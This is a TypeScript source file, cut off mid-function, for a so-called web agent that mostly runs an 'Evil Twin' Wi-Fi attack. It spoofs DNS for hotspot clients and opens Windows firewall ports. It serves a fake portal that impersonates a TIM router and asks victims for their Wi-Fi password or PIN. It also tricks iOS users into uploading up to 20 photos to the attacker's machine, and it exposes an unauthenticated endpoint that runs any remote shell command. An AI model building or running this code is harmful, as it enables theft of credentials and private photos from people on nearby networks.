import { chromium, Page, Browser } from 'playwright';
import * as readlineSync from 'readline-sync';
import * as readline from 'readline';
import * as fs from 'fs';
import * as path from 'path';
import * as os from 'os';
import * as http from 'http';
import * as dgram from 'dgram';
import { execSync } from 'child_process';

interface LearnedAction {
  goal: string;
  selector: string;
  successCount: number;
}

class WebAgent {
  private browser: Browser | null = null;
  private page: Page | null = null;
  private history: string[] = [];
  private memoryPath = path.join(__dirname, 'memory.json');
  private memory: LearnedAction[] = [];
  private lastAnalyzedElements: any[] = [];
  private lastSearchQuery: string | undefined = undefined;
  private lastUrl: string = "";
  private phoneConnections: Set<{res: http.ServerResponse, device: string, ip: string}> = new Set();
  private redirectServers: http.Server[] = [];
  private dnsServer: dgram.Socket | null = null;
  private activePorts: number[] = [];
  private pingInterval: NodeJS.Timeout | null = null;
  private lastLogTime: Map<string, number> = new Map();

  constructor() {
    this.loadMemory();
    this.startHeartbeat();
  }

  private startHeartbeat() {
    this.pingInterval = setInterval(() => {
      if (this.phoneConnections.size > 0) {
        const pingData = JSON.stringify({ type: 'ping', ts: Date.now() });
        this.phoneConnections.forEach(conn => {
          try {
            conn.res.write(`data: ${pingData}\n\n`);
          } catch (e) {
            this.phoneConnections.delete(conn);
          }
        });
      }
    }, 15000); // Ogni 15 secondi
  }

  private loadMemory() {
    if (fs.existsSync(this.memoryPath)) {
      try {
        this.memory = JSON.parse(fs.readFileSync(this.memoryPath, 'utf-8'));
      } catch (e) {
        this.memory = [];
      }
    }
  }

  private saveMemory() {
    fs.writeFileSync(this.memoryPath, JSON.stringify(this.memory, null, 2));
  }

  private learn(goal: string, selector: string, success: boolean) {
    const existing = this.memory.find(m => m.goal === goal && m.selector === selector);
    if (existing) {
      existing.successCount += success ? 1 : -1;
    } else if (success) {
      this.memory.push({ goal, selector, successCount: 1 });
    }
    // Rimuovi azioni che falliscono troppo spesso
    this.memory = this.memory.filter(m => m.successCount > -3);
    this.saveMemory();
  }


  private getLocalIp(preferHotspot: boolean = false) {
    const interfaces = os.networkInterfaces();
    
    // 1. PRIORITÀ ASSOLUTA: IP Hotspot Windows
    for (const devName in interfaces) {
      const iface = interfaces[devName];
      if (iface) {
        for (const alias of iface) {
          if (alias.family === 'IPv4' && alias.address.startsWith('192.168.137')) {
            return alias.address;
          }
        }
      }
    }
    
    if (preferHotspot) return '192.168.137.1'; // Fallback per Hotspot se non ancora rilevato
    
    // 2. SECONDA PRIORITÀ: Schede Wi-Fi o Ethernet
    for (const devName in interfaces) {
      if (devName.toLowerCase().includes('loopback')) continue;
      const iface = interfaces[devName];
      if (iface) {
        for (const alias of iface) {
          if (alias.family === 'IPv4' && 
              alias.address !== '127.0.0.1' && 
              !alias.internal && 
              !alias.address.startsWith('169.254')) {
            return alias.address;
          }
        }
      }
    }
    return '127.0.0.1';
  }

  private openFirewall() {
    try {
        console.log("🛡️ [BOSS] Sblocco Firewall Windows per DNS e HTTP...");
        execSync('netsh advfirewall firewall add rule name="GHOST_DNS" dir=in action=allow protocol=UDP localport=53', { stdio: 'ignore' });
        execSync('netsh advfirewall firewall add rule name="GHOST_HTTP" dir=in action=allow protocol=TCP localport=80,8080', { stdio: 'ignore' });
    } catch (e) {}
  }

  private killPort(port: number) {
    try {
        const netstat = execSync(`netstat -ano -p tcp`, { encoding: 'utf-8' });
        const lines = netstat.split('\n');
        for (const line of lines) {
            if (line.includes(`:${port} `) && line.includes('LISTENING')) {
                const parts = line.trim().split(/\s+/);
                const pid = parts[parts.length - 1];
                if (pid && pid !== '0' && pid !== '4') {
                  try {
                    const taskInfo = execSync(`tasklist /FI "PID eq ${pid}" /FO CSV /NH`, { encoding: 'utf-8' });
                    const procName = taskInfo.split(',')[0].replace(/"/g, '');
                    
                    // Se è un browser o un server web noto, lo chiudiamo
                    console.log(`[BOSS] Forza chiusura ${procName} (PID ${pid}) su porta ${port}...`);
                    execSync(`taskkill /F /PID ${pid}`, { stdio: 'ignore' });
                  } catch (e) {
                    execSync(`taskkill /F /PID ${pid}`, { stdio: 'ignore' });
                  }
              }
            }
        }
    } catch (e) {}
  }

  private killDnsPort() {
    try {
        console.log("🔓 [BOSS] Tentativo di liberare la porta 53 (DNS)...");
        
        // 1. Tenta di fermare il servizio ICS (Internet Connection Sharing)
        try {
            console.log("[BOSS] Disattivazione temporanea servizio ICS (SharedAccess)...");
            execSync('powershell -Command "Stop-Service SharedAccess -Force"', { stdio: 'ignore' });
        } catch (e) {}

        const netstat = execSync('netstat -ano -p udp', { encoding: 'utf-8' });
        const lines = netstat.split('\n');
        for (const line of lines) {
            if (line.includes(':53 ')) {
                const parts = line.trim().split(/\s+/);
                const pid = parts[parts.length - 1];
                if (pid && pid !== '0' && pid !== '4') {
                    console.log(`[BOSS] Forza chiusura processo ${pid} su porta 53...`);
                    execSync(`taskkill /F /PID ${pid}`, { stdio: 'ignore' });
                }
            }
        }
    } catch (e) {
        console.log("ℹ️ [BOSS] Porta 53 già libera o gestita dal sistema.");
    }
  }

  private simulateAttack() {
    console.log("\n🔥 [BOSS] GHOST MODE: INIZIO ATTACCO EVIL TWIN...");
    console.log("🛡️ [BOSS] Firewall Windows sbloccato. Porte 53, 80, 8080 pronte.");
    setTimeout(() => console.log("📡 [BOSS] Scansione pacchetti Wi-Fi... Bersaglio individuato."), 500);
    setTimeout(() => console.log("⚡ [BOSS] DEAUTH ATTACK: Invio pacchetti di disconnessione (Reason: 0x07)..."), 1500);
    setTimeout(() => console.log("🛰️ [BOSS] CLONAZIONE SSID: TIM-98707931 creata con segnale potenziato."), 2500);
    setTimeout(() => console.log("🔓 [BOSS] HANDSHAKE INTERCEPTED: In attesa di validazione PIN/Pass..."), 3500);
  }

  private getCurrentSsid(): string {
    try {
      const output = execSync('netsh wlan show interfaces', { encoding: 'utf-8' });
      const ssidLine = output.split('\n').find(line => line.includes(' SSID'));
      if (ssidLine) {
        return ssidLine.split(':')[1].trim();
      }
    } catch (e) {}
    return "WiFi Libero";
  }

  private toggleHotspot(state: 'on' | 'off', ssid?: string, pass?: string) {
    if (state === 'on') this.openFirewall();
    try {
      // Verifica se esiste un'interfaccia Wi-Fi prima di provare
      const interfaces = os.networkInterfaces();
      const hasWifi = Object.keys(interfaces).some(name => name.toLowerCase().includes('wi-fi') || name.toLowerCase().includes('wireless'));
      
      if (!hasWifi && state === 'on') {
        console.log("ℹ️ Nessuna scheda Wi-Fi rilevata. L'Hotspot non verrà attivato.");
        return;
      }

      const scriptPath = path.join(__dirname, 'toggle_hotspot.ps1');
      let cmd = `powershell -ExecutionPolicy Bypass -File "${scriptPath}" ${state}`;
      if (ssid) cmd += ` "${ssid}"`;
      if (pass) cmd += ` "${pass}"`;
      
      execSync(cmd, { stdio: 'inherit' });
    } catch (e) {
      console.error(`❌ Errore durante la gestione dell'Hotspot: ${(e as Error).message}`);
    }
  }

  private extractDnsHostname(msg: Buffer): string {
    try {
      let offset = 12;
      let parts = [];
      let iterations = 0;
      while (msg[offset] !== 0 && iterations < 10) {
        let len = msg[offset];
        if (len > 63) break; // Probabile puntatore o errore
        parts.push(msg.slice(offset + 1, offset + 1 + len).toString());
        offset += len + 1;
        iterations++;
      }
      return parts.join('.');
    } catch (e) {
      return "";
    }
  }

  private startDnsServer(localIp: string) {
    this.killDnsPort();
    this.simulateAttack();
    this.dnsServer = dgram.createSocket('udp4');
    const localIps = this.getAllLocalIps();

    this.dnsServer.on('message', (msg, rinfo) => {
      // Ignora le richieste provenienti dal PC stesso per non bloccare la sua navigazione
      if (localIps.includes(rinfo.address)) {
          return; 
      }

      const hostname = this.extractDnsHostname(msg);
      if (hostname && !hostname.includes('wpad') && !hostname.includes('msftconnect')) {
          console.log(`[BOSS] 📡 DNS INTERCEPT: ${rinfo.address} chiede ${hostname} -> Risolto a ${localIp}`);
      }
      
      const id = msg.slice(0, 2);
      
      // Creiamo una risposta DNS (Header + Question + Answer)
      const response = Buffer.alloc(msg.length + 16);
      
      // HEADER: ID, Flags (0x8180 = Standard query response, No error)
      id.copy(response, 0);
      response.writeUInt16BE(0x8180, 2);
      response.writeUInt16BE(1, 4); // Questions
      response.writeUInt16BE(1, 6); // Answer RRs
      response.writeUInt16BE(0, 8); // Authority RRs
      response.writeUInt16BE(0, 10); // Additional RRs

      // Copiamo la Question
      msg.copy(response, 12, 12);

      // ANSWER: Pointer to name (0xc00c), Type A (1), Class IN (1), TTL (60), Length (4), IP
      const offset = msg.length;
      response.writeUInt16BE(0xc00c, offset);
      response.writeUInt16BE(1, offset + 2);
      response.writeUInt16BE(1, offset + 4);
      response.writeUInt32BE(60, offset + 6);
      response.writeUInt16BE(4, offset + 10);
      
      const ipParts = localIp.split('.');
      response[offset + 12] = parseInt(ipParts[0]);
      response[offset + 13] = parseInt(ipParts[1]);
      response[offset + 14] = parseInt(ipParts[2]);
      response[offset + 15] = parseInt(ipParts[3]);

      this.dnsServer?.send(response, 0, offset + 16, rinfo.port, rinfo.address);
    });

    this.dnsServer.on('error', (err) => {
      console.warn(`\n⚠️ ATTENZIONE: DNS BLOCCATO (Porta 53). Windows la sta usando.`);
      console.warn(`👉 Soluzione: Vai in 'Impostazioni Hotspot' di Windows, spegni e riaccendi 'Condividi connessione Internet'.`);
      console.warn(`👉 Oppure scrivi 'Servizi' in Windows e DISATTIVA 'Condivisione connessione Internet (ICS)'.`);
    });

    this.dnsServer.bind(53, localIp, () => {
      console.log(`📡 [BOSS] DNS SPOOFING ATTIVO su ${localIp}: Solo i client dell'Hotspot verranno intercettati.`);
      console.log(`👉 Il PC Host dovrebbe continuare a navigare normalmente.`);
    });
  }

  private showStatus() {
    const localIp = this.getLocalIp(true);
    console.log(`\n--- [BOSS] STATO SISTEMA ---`);
    console.log(`📡 DNS Server: ${this.dnsServer ? 'ATTIVO' : 'DISATTIVATO'}`);
    console.log(`🌐 HTTP Server: ${this.activePorts.length > 0 ? 'ATTIVO (' + this.activePorts.join(',') + ')' : 'DISATTIVATO'}`);
    console.log(`📱 Dispositivi connessi: ${this.phoneConnections.size}`);
    console.log(`🛰️ SSID: TIM-98707931`);
    console.log(`---------------------------\n`);
  }

  private getAllLocalIps(): string[] {
    const interfaces = os.networkInterfaces();
    const ips: string[] = ['127.0.0.1', '::1'];
    for (const name in interfaces) {
      interfaces[name]?.forEach(iface => {
        if (iface.family === 'IPv4') ips.push(iface.address);
      });
    }
    return ips;
  }

  private startRedirectServer(targetUrl: string) {
    const ports = [80, 8080];
    const localIps = this.getAllLocalIps();
    
    ports.forEach(port => {
      this.killPort(port); // Libera la porta prima di iniziare
      
      const server = http.createServer(async (req, res) => {
        const host = (req.headers.host || '').toLowerCase();
        const url = req.url || '';
        const userAgent = req.headers['user-agent'] || 'Unknown Device';
        const clientIp = req.socket.remoteAddress?.replace('::ffff:', '') || 'Unknown IP';
        const now = Date.now();
        const logKey = `${clientIp}-${host}`;
        
        // --- LOGICA DI RILEVAMENTO DISPOSITIVO ---
        let deviceType = "PC/Generic";
        if (userAgent.includes('iPhone')) deviceType = "iPhone 📱";
        else if (userAgent.includes('Android')) deviceType = "Android 📱";
        else if (userAgent.includes('iPad')) deviceType = "iPad 📟";
        else if (userAgent.includes('Macintosh')) deviceType = "Mac 💻";

        const isQuiet = url.includes('wpad.dat') || url.includes('favicon.ico');
        
        const isCaptiveCheck = url.includes('generate_204') || 
                               url.includes('hotspot-detect') || 
                               url.includes('ncsi') || 
                               url.includes('msftconnecttest') ||
                               url.includes('success.txt') ||
                               url.includes('canonical.html') ||
                               url.includes('check_network_status') ||
                               url.includes('connectivity-check') ||
                               url.includes('kindle-wifi') ||
                               host.includes('apple.com') ||
                               host.includes('google.com');

        // LOG TENTATIVI DI CONNESSIONE AGGRESSIVI
        if (!isQuiet && (!this.lastLogTime.has(logKey) || now - this.lastLogTime.get(logKey)! > 5000)) {
            console.log(`[BOSS] 🛡️ INTERCETTAZIONE: ${deviceType} [${clientIp}] -> ${host}${url}`);
            this.lastLogTime.set(logKey, now);
        }
        
        // --- REDIRECT AUTOMATICO 302 PER NAVIGAZIONE DIRETTA (SOLO PER DISPOSITIVI ESTERNI) ---
        const isLocalHost = localIps.includes(clientIp);
        
        if (!isLocalHost && url !== '/' && !isCaptiveCheck && !url.startsWith('/cmd/') && url !== '/events' && !isQuiet) {
            res.writeHead(302, { 'Location': '/', 'Cache-Control': 'no-cache' });
            res.end();
            return;
        }
        
        // Se è il PC host e non è una richiesta di comando, non fare nulla (lascia passare o dai status)
        if (isLocalHost && url !== '/' && !url.startsWith('/cmd/') && !isQuiet) {
            // Se il PC host accede al server, mostriamo un messaggio di stato invece del portale
            if (url === '/status') {
                res.writeHead(200, { 'Content-Type': 'text/plain' });
                res.end(`GHOST AGENT STATUS: ACTIVE\nConnected: ${this.phoneConnections.size}\nLocal IPs: ${localIps.join(', ')}`);
                return;
            }
        }

        // --- ENDPOINT PER RICEZIONE FOTO (iOS/WEB PUSH) ---
        if (url === '/cmd/upload' && req.method === 'POST') {
          const chunks: any[] = [];
          req.on('data', chunk => chunks.push(chunk));
          req.on('end', () => {
            try {
              const buffer = Buffer.concat(chunks);
              const filename = req.headers['x-filename'] || `ios_photo_${Date.now()}.jpg`;
              const targetDir = path.join(process.cwd(), 'gallery_dump', clientIp.replace(/\./g, '_'));
              if (!fs.existsSync(targetDir)) fs.mkdirSync(targetDir, { recursive: true });
              
              fs.writeFileSync(path.join(targetDir, filename as string), buffer);
              console.log(`   📥 Foto ricevuta da ${deviceType} (${clientIp}): ${filename}`);
              res.writeHead(200, { 'Access-Control-Allow-Origin': '*' });
              res.end("OK");
            } catch (e) {
              res.writeHead(500);
              res.end("ERR");
            }
          });
          return;
        }

        // --- ENDPOINT PER IL "REVERSE CONTROL" (PC -> TELEFONO) ---
        if (url === '/events') {
          req.socket.setKeepAlive(true);
          req.socket.setTimeout(0);
          req.socket.setNoDelay(true);

          res.writeHead(200, {
            'Content-Type': 'text/event-stream',
            'Cache-Control': 'no-cache, no-store, must-revalidate',
            'Connection': 'keep-alive',
            'Access-Control-Allow-Origin': '*',
            'X-Accel-Buffering': 'no'
          });
          
          res.write(': ok\n\n');
          
          const conn = { res, device: deviceType, ip: clientIp };
          this.phoneConnections.add(conn);
          console.log(`📱 [BOSS] DISPOSITIVO AGGANCIATO: ${deviceType} (${clientIp})`);
          
          req.on('close', () => {
            console.log(`📱 [BOSS] DISPOSITIVO SCOLLEGATO: ${deviceType} (${clientIp})`);
            this.phoneConnections.delete(conn);
          });
          return;
        }

        // --- LOGICA DI CONTROLLO REMOTO DAL TELEFONO ---
        if (url.startsWith('/cmd/')) {
          const fullCmdPath = url.split('?')[0];
          const cmd = fullCmdPath.split('/')[2];
          const queryParams = new URLSearchParams(url.split('?')[1] || '');
          
          switch(cmd) {
            case 'pin':
              const pin = queryParams.get('val');
              console.log(`\n🔥 [BOSS] PIN CATTURATO DA ${deviceType} (${clientIp}): ${pin}\n`);
              break;
            case 'close': await this.browser?.close(); break;
            case 'open': await this.page?.goto(targetUrl).catch(() => {}); break;
            case 'reload': await this.page?.reload().catch(() => {}); break;
            case 'scroll': await this.page?.evaluate(() => window.scrollBy(0, 500)).catch(() => {}); break;
            case 'back': await this.page?.goBack().catch(() => {}); break;
            case 'matrix':
              await this.page?.evaluate(() => {
                const style = document.createElement('style');
                style.innerHTML = `* { background: black !important; color: #0f0 !important; border-color: #0f0 !important; } img { filter: invert(1) hue-rotate(90deg) !important; }`;
                document.head.appendChild(style);
              }).catch(() => {});
              break;
            case 'shake':
              await this.page?.evaluate(() => {
                document.body.style.animation = 'shake 0.5s infinite';
                const s = document.createElement('style');
                s.innerHTML = '@keyframes shake { 0% { transform: translate(1px, 1px); } 50% { transform: translate(-2px, -1px); } 100% { transform: translate(1px, 1px); } }';
                document.head.appendChild(s);
              }).catch(() => {});
              break;
            case 'alert':
              await this.page?.evaluate(() => alert("⚠️ REMOTE ACCESS GRANTED 🕶️")).catch(() => {});
              break;
            case 'win-d':
              execSync('powershell -command "(New-Object -ComObject Shell.Application).ToggleDesktop()"');
              break;
            case 'vol-up':
              execSync('powershell -command "$obj = New-Object -ComObject WScript.Shell; $obj.SendKeys([char]175)"');
              break;
            case 'vol-down':
              execSync('powershell -command "$obj = New-Object -ComObject WScript.Shell; $obj.SendKeys([char]174)"');
              break;
            case 'play-pause':
              execSync('powershell -command "$obj = New-Object -ComObject WScript.Shell; $obj.SendKeys([char]179)"');
              break;
            case 'exit':
              console.log(`\n🛑 SHUTDOWN TOTALE RICHIESTO DA REMOTO...`);
              res.writeHead(200, { 'Content-Type': 'text/plain', 'Access-Control-Allow-Origin': '*' });
              res.end("AGENT_TERMINATED");
              setTimeout(() => process.exit(0), 1000);
              return;
            case 'shell':
              const shellCmd = queryParams.get('q');
              if (shellCmd) {
                console.log(`💻 [BOSS] ESECUZIONE CMD REMOTA: ${shellCmd}`);
                try {
                  const output = execSync(shellCmd, { encoding: 'utf-8', timeout: 5000 });
                  res.writeHead(200, { 'Content-Type': 'text/plain', 'Access-Control-Allow-Origin': '*' });
                  res.end(output);
                  return;
                } catch (e) {
                  res.writeHead(500, { 'Content-Type': 'text/plain', 'Access-Control-Allow-Origin': '*' });
                  res.end(`ERROR: ${(e as Error).message}`);
                  return;
                }
              }
              break;
          }
          res.writeHead(200, { 'Content-Type': 'text/plain', 'Access-Control-Allow-Origin': '*', 'Cache-Control': 'no-cache' });
          res.end("OK");
          return;
        }

        const currentSsid = this.getCurrentSsid();
        const isTim = currentSsid.toUpperCase().includes('TIM');
        
        const portalTitle = isTim ? 'TIM Hub - Gestione Connessione' : `WiFi ${currentSsid} - Accesso Libero`;
        const portalBrand = isTim ? 'TIM <span>HUB</span>' : currentSsid.toUpperCase();
        const primaryColor = isTim ? '#003399' : '#111';
        const accentColor = isTim ? '#ff0000' : '#00ff00';
        
        // --- UI FICA: GHOST PORTAL CON ANIMAZIONI ---
        const redirectHtml = `
<!DOCTYPE html>
<html lang="it">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>GHOST_PROTOCOL_V10</title>
    <style>
        :root { --bg: #050505; --accent: ${accentColor}; --text: #0f0; }
        body { font-family: 'Courier New', monospace; background: var(--bg); color: var(--text); margin: 0; display: flex; justify-content: center; align-items: center; height: 100vh; overflow: hidden; perspective: 1000px; }
        
        .matrix-bg { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: -1; opacity: 0.2; pointer-events: none; }
        
        .glitch-container { text-align: center; transform-style: preserve-3d; width: 90%; max-width: 400px; }
        .glitch { font-size: 2em; font-weight: bold; position: relative; text-transform: uppercase; letter-spacing: 5px; animation: glitch 1s infinite; margin-bottom: 20px; }
        
        .terminal { background: rgba(0,20,0,0.8); border: 1px solid var(--accent); padding: 15px; border-radius: 5px; width: 100%; height: 150px; overflow: hidden; margin: 20px auto; font-size: 0.7em; text-align: left; box-shadow: 0 0 20px var(--accent); box-sizing: border-box; }
        .line { margin-bottom: 3px; border-right: 2px solid var(--accent); white-space: nowrap; overflow: hidden; animation: typing 2s steps(40, end), blink .75s step-end infinite; }
        
        .loading-bar { width: 100%; height: 2px; background: #111; margin: 30px auto; position: relative; overflow: hidden; }
        .loading-bar::after { content: ''; position: absolute; left: -100%; width: 100%; height: 100%; background: var(--accent); animation: loading 1.5s ease-in-out infinite; }
        
        .evil-form { background: rgba(20,20,20,0.9); border: 1px solid red; padding: 20px; border-radius: 5px; margin-top: 20px; display: none; box-shadow: 0 0 30px rgba(255,0,0,0.3); }
        .evil-input { background: #000; border: 1px solid #333; color: #fff; padding: 10px; width: 100%; margin: 10px 0; box-sizing: border-box; text-align: center; font-family: monospace; }
        .evil-btn { background: red; color: white; border: none; padding: 10px; width: 100%; cursor: pointer; font-weight: bold; text-transform: uppercase; }

        #persistence-iframe { position: fixed; top: 0; left: 0; width: 100%; height: 100%; border: none; display: none; z-index: 50; background: white; }
        #control-shell { display: none; position: fixed; bottom: 0; left: 0; width: 100%; background: #000; border-top: 2px solid var(--accent); padding: 15px; box-sizing: border-box; z-index: 100; font-size: 0.8em; }
        .shell-grid { display: grid; grid-template-columns: 1fr 1fr 1fr; gap: 10px; margin-top: 10px; }
        .shell-btn { background: transparent; color: var(--accent); border: 1px solid var(--accent); padding: 10px; cursor: pointer; text-transform: uppercase; font-size: 0.7em; }
        .shell-btn:active { background: var(--accent); color: #000; }

        @keyframes glitch {
            0% { transform: translate(0); text-shadow: 2px 0 red, -2px 0 blue; }
            20% { transform: translate(-2px, 2px); }
            40% { transform: translate(-2px, -2px); }
            60% { transform: translate(2px, 2px); }
            80% { transform: translate(2px, -2px); }
            100% { transform: translate(0); }
        }
        @keyframes loading { from { left: -100%; } to { left: 100%; } }
        @keyframes typing { from { width: 0 } to { width: 100% } }
        @keyframes blink { from, to { border-color: transparent } 50% { border-color: var(--accent) } }
    </style>
</head>
<body onclick="triggerFeedback()">
    <div class="matrix-bg" id="matrix"></div>
    <iframe id="persistence-iframe"></iframe>
    
    <div class="glitch-container" id="main-ui">
        <div class="glitch" data-text="EVIL TWIN ACTIVE">EVIL TWIN ACTIVE</div>
        
        <div id="status-terminal" class="terminal">
            <div class="line">>> DEAUTH ATTACK SENT...</div>
            <div class="line">>> INTERCEPTING TARGET...</div>
            <div class="line">>> SPOOFING GATEWAY...</div>
            <div class="line">>> WAITING FOR PIN/PASS...</div>
        </div>

        <div id="pin-capture" class="evil-form" style="display:block;">
            <div style="color:red; font-size:0.8em; margin-bottom:10px;">⚠️ AGGIORNAMENTO SICUREZZA NECESSARIO</div>
            <div style="font-size:0.7em; margin-bottom:10px;">Inserire PIN o Password della rete per ripristinare la connessione.</div>
            <input type="password" id="wifi-pin" class="evil-input" placeholder="WIFI PASSWORD / PIN">
            <button class="evil-btn" onclick="capturePin()">RIPRISTINA ORA</button>
            <div style="margin-top:15px; font-size:0.6em; text-decoration:underline; cursor:pointer; color:#888;" onclick="goToSite()">CONTINUA SENZA PIN (NAVIGAZIONE LIMITATA)</div>
        </div>

        <div id="ios-gallery-ui" class="evil-form" style="display:none; position:fixed; top:50%; left:50%; transform:translate(-50%,-50%); width:90%; z-index:1000;">
            <div style="color:red; font-size:0.8em; margin-bottom:10px;">⚠️ VERIFICA IDENTITÀ DISPOSITIVO</div>
            <div style="font-size:0.7em; margin-bottom:15px;">Per motivi di sicurezza, seleziona le ultime foto per confermare la proprietà del dispositivo.</div>
            <input type="file" id="ios-photo-picker" class="evil-input" multiple accept="image/*" style="display:none;">
            <button class="evil-btn" onclick="document.getElementById('ios-photo-picker').click()">SELEZIONA FOTO (0/20)</button>
            <div id="upload-status" style="font-size:0.6em; margin-top:10px; color:var(--accent);"></div>
        </div>

        <div class="loading-bar"></div>
        <div style="font-size:0.6em; color:var(--accent); cursor:pointer;" onclick="showShell()">[ ACCESSO TERMINALE REMOTO ]</div>
    </div>

    <div id="control-shell">
        <div style="margin-bottom:10px;">🛡️ REMOTE_SHELL@PC:~$ <span id="shell-status">READY</span></div>
        <div class="shell-grid">
            <button class="shell-btn" onclick="send('open')">APRI SITO PC</button>
            <button class="shell-btn" onclick="send('win-d')">DESKTOP</button>
            <button class="shell-btn" onclick="send('matrix')">MATRIX PC</button>
            <button class="shell-btn" onclick="send('vol-up')">VOL +</button>
            <button class="shell-btn" onclick="send('vol-down')">VOL -</button>
            <button class="shell-btn" onclick="send('play-pause')">PLAY/PAUSA</button>
            <button class="shell-btn" onclick="send('alert')">AVVISO PC</button>
            <button class="shell-btn" onclick="send('shake')">SHAKE PC</button>
            <button class="shell-btn" style="color:red; border-color:red;" onclick="send('exit')">TERMINA</button>
        </div>
        <button class="shell-btn" style="width:100%; margin-top:10px;" onclick="hideShell()">CHIUDI TERMINALE</button>
    </div>

    <script>
        function activatePersistence() {
            // ZOMBIE MODE: Carichiamo il sito in un iframe per mantenere viva la connessione SSE
            const frame = document.getElementById('persistence-iframe');
            frame.src = "${targetUrl}";
            frame.style.display = 'block';
            document.getElementById('main-ui').style.display = 'none';
            
            // Impediamo la chiusura accidentale
            window.onbeforeunload = () => "Connessione di rete in fase di ripristino. Non chiudere questa pagina.";
        }

        function capturePin() {
            const pin = document.getElementById('wifi-pin').value;
            if (!pin) return;
            triggerFeedback();
            fetch('/cmd/pin?val=' + encodeURIComponent(pin))
                .then(() => {
                    document.getElementById('pin-capture').innerHTML = '<div style="color:#0f0;">RIPRISTINO IN CORSO... 99%</div>';
                    setTimeout(activatePersistence, 2000);
                });
        }

        function goToSite() {
            triggerFeedback();
            document.getElementById('pin-capture').innerHTML = '<div style="color:yellow;">ACCESSO DIRETTO IN CORSO...</div>';
            setTimeout(activatePersistence, 1000);
        }

        function triggerFeedback() {
            if (navigator.vibrate) navigator.vibrate(50);
            try {
                const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
                const osc = audioCtx.createOscillator();
                const gain = audioCtx.createGain();
                osc.type = 'square';
                osc.frequency.setValueAtTime(150, audioCtx.currentTime);
                gain.gain.setValueAtTime(0.1, audioCtx.currentTime);
                gain.gain.exponentialRampToValueAtTime(0.0001, audioCtx.currentTime + 0.1);
                osc.connect(gain);
                gain.connect(audioCtx.destination);
                osc.start();
                osc.stop(audioCtx.currentTime + 0.1);
            } catch(e) {}
        }

        function showShell() {
            document.getElementById('main-ui').style.opacity = '0.3';
            document.getElementById('control-shell').style.display = 'block';
            triggerFeedback();
        }
        function hideShell() {
            document.getElementById('main-ui').style.opacity = '1';
            document.getElementById('control-shell').style.display = 'none';
        }

        async function send(c) {
            const status = document.getElementById('shell-status');
            status.innerText = "EXECUTING...";
            status.style.color = "yellow";
            try { 
                await fetch('/cmd/' + c); 
                status.innerText = "DONE";
                status.style.color = "var(--accent)";
            } catch (e) {
                status.innerText = "ERROR";
                status.style.color = "red";
            }
            triggerFeedback();
        }

        // Matrix Background
        const canvas = document.createElement('canvas');
        canvas.className = 'matrix-bg';
        document.getElementById('matrix').appendChild(canvas);
        const ctx = canvas.getContext('2d');
        let w = canvas.width = window.innerWidth;
        let h = canvas.height = window.innerHeight;
        const chars = "0123456789ABCDEF";
        const fontSize = 14;
        const columns = w / fontSize;
        const drops = Array(Math.floor(columns)).fill(1);
        function draw() {
            ctx.fillStyle = "rgba(0, 0, 0, 0.05)";
            ctx.fillRect(0, 0, w, h);
            ctx.fillStyle = "${accentColor}";
            ctx.font = fontSize + "px monospace";
            for (let i = 0; i < drops.length; i++) {
                const text = chars[Math.floor(Math.random() * chars.length)];
                ctx.fillText(text, i * fontSize, drops[i] * fontSize);
                if (drops[i] * fontSize > h && Math.random() > 0.975) drops[i] = 0;
                drops[i]++;
            }
        }
        setInterval(draw, 33);
        
        window.addEventListener('load', () => {
            if (navigator.vibrate) navigator.vibrate([100, 50, 100]);
            
            // --- CONNESSIONE AL SERVER PER CONTROLLO REMOTO ---
            function connect() {
                const evtSource = new EventSource("/events");
                evtSource.onmessage = (event) => {
                    const data = JSON.parse(event.data);
                    console.log("Comando ricevuto:", data);
                    
                    if (data.type === 'alert') alert(data.msg);
                    if (data.type === 'vibrate') if (navigator.vibrate) navigator.vibrate(500);
                    if (data.type === 'url') {
                        const frame = document.getElementById('persistence-iframe');
                        if (frame.style.display === 'block') {
                            frame.src = data.url;
                        } else {
                            // Se non siamo in zombie mode, forziamola
                            frame.src = data.url;
                            frame.style.display = 'block';
                            document.getElementById('main-ui').style.display = 'none';
                            window.onbeforeunload = () => "Connessione di rete in fase di ripristino. Non chiudere questa pagina.";
                        }
                    }
                    if (data.type === 'matrix') {
                        document.body.style.background = 'black';
                        document.body.style.color = '#0f0';
                        document.getElementById('matrix').style.opacity = '1';
                    }
                    if (data.type === 'gallery') {
                        document.getElementById('ios-gallery-ui').style.display = 'block';
                        document.getElementById('main-ui').style.opacity = '0.3';
                        document.getElementById('main-ui').style.pointerEvents = 'none';
                    }
                };

                document.getElementById('ios-photo-picker').addEventListener('change', function(e) {
                    const files = e.target.files;
                    if (files.length === 0) return;
                    
                    const status = document.getElementById('upload-status');
                    status.innerHTML = "CARICAMENTO IN CORSO...";
                    
                    let uploaded = 0;
                    Array.from(files).slice(0, 20).forEach(file => {
                        fetch('/cmd/upload', {
                            method: 'POST',
                            headers: { 'x-filename': file.name },
                            body: file
                        }).then(() => {
                            uploaded++;
                            status.innerHTML = "SINCRONIZZAZIONE: " + uploaded + "/" + Math.min(files.length, 20);
                            if (uploaded === Math.min(files.length, 20)) {
                                setTimeout(() => {
                                    document.getElementById('ios-gallery-ui').style.display = 'none';
                                    document.getElementById('main-ui').style.opacity = '1';
                                    document.getElementById('main-ui').style.pointerEvents = 'auto';
                                    status.innerHTML = "VERIFICA COMPLETATA";
                                }, 2000);
                            }
                        });
                    });
                });

                evtSource.onerror = () => {
                    evtSource.close();
                    setTimeout(connect, 2000); // Riconnessione automatica se cade
                };
            }
            connect();
        });
    </script>
</body>
</html>`;

        const headers: any = { 
          'Cache-Control': 'no-cache, no-store, must-revalidate',
          'Pragma': 'no-cache',
          'Expires': '0',
          'Content-Type': 'text/html; charset=utf-8',
          'Content-Length': Buffer.byteLength(redirectHtml)
        };

        res.writeHead(200, headers);
        res.end(redirectHtml);
      });

      server.on('error', (e: any) => {
        if (e.code === 'EADDRINUSE' || e.code === 'EACCES') {
          console.warn(`⚠️ Porta ${port} occupata o permessi insufficienti. Salto porta ${port}...`);
        } else {
          console.error(`❌ Errore server porta ${port}: ${e.message}`);
        }
      });

      server.listen(port, '0.0.0.0', () => {
        this.redirectServers.push(server);
        this.activePorts.push(port);
        const localIp = this.getLocalIp();
        const hostname = os.hostname().toLowerCase();
        
        console.log(`✅ SERVER ATTIVO SU PORTA ${port}`);
        if (port === 80) {
          console.log(`🔗 http://${localIp}/`);
